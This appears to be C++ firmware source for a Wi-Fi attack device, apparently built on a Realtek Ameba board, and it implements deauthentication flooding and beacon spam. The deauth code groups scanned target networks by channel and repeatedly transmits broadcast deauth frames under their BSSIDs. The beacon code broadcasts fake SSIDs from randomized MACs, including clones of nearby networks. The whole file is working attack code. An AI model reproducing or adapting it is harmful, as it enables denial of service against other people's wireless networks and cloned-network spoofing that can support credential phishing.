// STL MUST come first
#undef max
#include <vector>

#include "wifi_attacks.h"

// ── Built-in SSID table ───────────────────────────────────
const char* BEACON_SSIDS[] = {
  "FBI Surveillance Van",
  "Loading... Please Wait",
  "Not Your WiFi",
  "Virus Detected!",
  "DEA Surveillance",
  "NSA MonitoringUnit4",
  "Skynet Global Defense",
  "Definitely Not NSA",
  "Pretty Fly for a WiFi",
  "The Internet",
  "Abraham Linksys",
  "Benjamin FrankLAN",
  "Bill Wi the Science Fi",
  "LAN Solo",
  "Tell My WiFi Love Her",
  "Wu-Tang LAN",
  "NETGEAR_EXT",
  "TP-Link_5G_EXT",
  "DIRECT-Roku-Player",
  "xfinitywifi",
  "ATT-WIFI-0001",
  "CLARO_FIBRA_5G",
  "VIVO-Fibra-EXT",
  "TIM_LIVE_2G",
  "HackerNet",
};

// ── Deauth state ──────────────────────────────────────────
ChannelGroup deauth_groups[MAX_CHANNELS];
int          deauth_group_count = 0;
int          current_group_idx  = 0;
uint32_t     sent_frames        = 0;
int          frames_per_deauth  = 3;  // frames por chamada (sem delay bloqueante)
int          send_delay_ms      = 0;  // obsoleto, mantido por compatibilidade
bool         isDeauthing        = false;

// ── Beacon state ──────────────────────────────────────────
uint8_t      beacon_mac[6]         = {0xAA, 0xBB, 0xCC, 0x00, 0x00, 0x00};
uint8_t      broadcast_mac[6]      = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int          beacon_ssid_idx       = 0;
uint32_t     beacon_frames         = 0;
bool         isBeaconing           = false;

BeaconMode   beacon_mode           = BEACON_MODE_RANDOM;
int          beacon_count          = 25;         // default: 25 SSIDs
char         beacon_custom_ssid[33]= "R4BB1T";   // default custom name

// ── get_beacon_ssid ───────────────────────────────────────
// SSID uniqueness strategy (safe, 802.11 max = 32 bytes):
//
//   RANDOM / CLONE: cycle through the pool of base SSIDs.
//     Each full cycle through the pool adds 1 NBSP pair (2 bytes) as suffix.
//     So idx=0..N-1 → pool[0..N-1] + no suffix
//        idx=N..2N-1 → pool[0..N-1] + 1 NBSP
//        idx=2N..3N-1 → pool[0..N-1] + 2 NBSP
//        ...capped when base+suffix would exceed 32 bytes.
//
//   CUSTOM: single base SSID. Each idx adds 1 NBSP pair as suffix,
//     capped at 32 bytes total.
//
// `out` must be at least 33 bytes.
void get_beacon_ssid(int idx, char* out, size_t outLen) {
  const char NBSP[2] = {(char)0xC2, (char)0xA0}; // UTF-8 Non-Breaking Space
  const int  SSID_MAX = 32; // 802.11 hard limit

  const char* base     = nullptr;
  char        cloneBase[33];
  int         poolSz   = 0;
  int         nbspCnt  = 0; // how many NBSP pairs to append

  switch (beacon_mode) {
    case BEACON_MODE_CUSTOM:
      base     = beacon_custom_ssid;
      poolSz   = 1;
      nbspCnt  = idx;          // 1 NBSP pair per idx
      break;

    case BEACON_MODE_CLONE: {
      int pool[MAX_SCAN_RESULTS];
      for (int i = 0; i < (int)scan_results.size(); i++)
        if (net_marked[i]) pool[poolSz++] = i;
      if (poolSz == 0)
        for (int i = 0; i < (int)scan_results.size(); i++) pool[poolSz++] = i;
      if (poolSz > 0) {
        int netIdx = pool[idx % poolSz];
        scan_results[netIdx].ssid.substring(0, 32).toCharArray(cloneBase, sizeof(cloneBase));
        base = cloneBase;
      } else {
        base   = "Network";
        poolSz = 1;
      }
      nbspCnt = idx / poolSz;   // 1 NBSP pair added per full cycle
      break;
    }

    default: // BEACON_MODE_RANDOM
      base    = BEACON_SSIDS[idx % NUM_BEACON_SSIDS];
      poolSz  = NUM_BEACON_SSIDS;
      nbspCnt = idx / NUM_BEACON_SSIDS; // 1 NBSP per full cycle through 25 SSIDs
      break;
  }

  // Copy base, capped at SSID_MAX
  size_t blen = strlen(base);
  if ((int)blen > SSID_MAX)   blen = SSID_MAX;
  if (blen >= outLen)         blen = outLen - 1;
  memcpy(out, base, blen);
  size_t pos = blen;

  // Append NBSP pairs — hard stop at SSID_MAX total
  for (int n = 0; n < nbspCnt; n++) {
    if ((int)(pos + 2) > SSID_MAX) break; // 802.11 limit
    if (pos + 2 >= outLen)         break; // buffer limit
    out[pos++] = NBSP[0];
    out[pos++] = NBSP[1];
  }
  out[pos] = '\0';
}

// ── Deauth ────────────────────────────────────────────────
static int last_hw_deauth_channel = -1;

void start_deauth() {
  deauth_group_count = 0;
  current_group_idx  = 0;
  last_hw_deauth_channel = -1;

  // Se nenhum alvo foi marcado, mas temos scan_results, usa o alvo atualmente selecionado
  bool any_marked = false;
  for (int i = 0; i < (int)scan_results.size(); i++) {
    if (net_marked[i]) { any_marked = true; break; }
  }
  if (!any_marked && !scan_results.empty() && net_sel < (int)scan_results.size()) {
    net_marked[net_sel] = true;
  }

  for (int i = 0; i < (int)scan_results.size(); i++) {
    if (net_marked[i]) {
      int ch = scan_results[i].channel;
      int g_idx = -1;
      for (int g = 0; g < deauth_group_count; g++) {
        if (deauth_groups[g].channel == ch) { g_idx = g; break; }
      }
      if (g_idx == -1 && deauth_group_count < MAX_CHANNELS) {
        g_idx = deauth_group_count++;
        deauth_groups[g_idx].channel = ch;
        deauth_groups[g_idx].count   = 0;
      }
      if (g_idx != -1 && deauth_groups[g_idx].count < MAX_SCAN_RESULTS) {
        deauth_groups[g_idx].targets[deauth_groups[g_idx].count++] = i;
      }
    }
  }

  if (deauth_group_count > 0) {
    isDeauthing       = true;
    sent_frames       = 0;
    current_group_idx = 0;
    enable_rgb_attack_mode();
  }
}

void stop_deauth() {
  isDeauthing        = false;
  deauth_group_count = 0;
  current_group_idx  = 0;
  last_hw_deauth_channel = -1;
  disable_rgb_attack_mode();
}

void run_deauth_frame() {
  if (!isDeauthing || deauth_group_count == 0) return;

  ChannelGroup &g = deauth_groups[current_group_idx % deauth_group_count];
  if (last_hw_deauth_channel != g.channel) {
    wext_set_channel(WLAN0_NAME, g.channel);
    last_hw_deauth_channel = g.channel;
    delay(2);
  }

  for (int f = 0; f < frames_per_deauth; f++) {
    for (int t = 0; t < g.count; t++) {
      int idx = g.targets[t];
      if (idx < (int)scan_results.size()) {
        uint8_t bssid_copy[6];
        memcpy(bssid_copy, scan_results[idx].bssid, 6);
        wifi_tx_deauth_frame(bssid_copy, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
        sent_frames++;
      }
    }
    delay(1);
    yield();
  }

  current_group_idx = (current_group_idx + 1) % deauth_group_count;
}

// ── Beacon ────────────────────────────────────────────────
void start_beacon() {
  wext_set_channel(WLAN0_NAME, 1);
  delay(5);
  isBeaconing     = true;
  beacon_frames   = 0;
  beacon_ssid_idx = 0;
  enable_rgb_attack_mode();
}

void stop_beacon() {
  isBeaconing = false;
  disable_rgb_attack_mode();
}

void run_beacon_frame() {
  if (!isBeaconing) return;

  // Randomize last 3 bytes of MAC for each frame
  for (int i = 3; i < 6; i++) beacon_mac[i] = random(0, 256);

  // Build unique SSID for current index (max 36 bytes: 32 base + idx*2 NBSP)
  char ssidBuf[64];
  int safe_count = (beacon_count > 0) ? beacon_count : 25;
  get_beacon_ssid(beacon_ssid_idx % safe_count, ssidBuf, sizeof(ssidBuf));

  wifi_tx_beacon_frame(beacon_mac, broadcast_mac, ssidBuf);
  beacon_frames++;

  // Delay curto permite drenagem segura dos descriptors na interface do Ameba
  delay(2);
  yield();

  // Advance through beacon_count SSIDs (wrapping)
  beacon_ssid_idx = (beacon_ssid_idx + 1) % safe_count;
}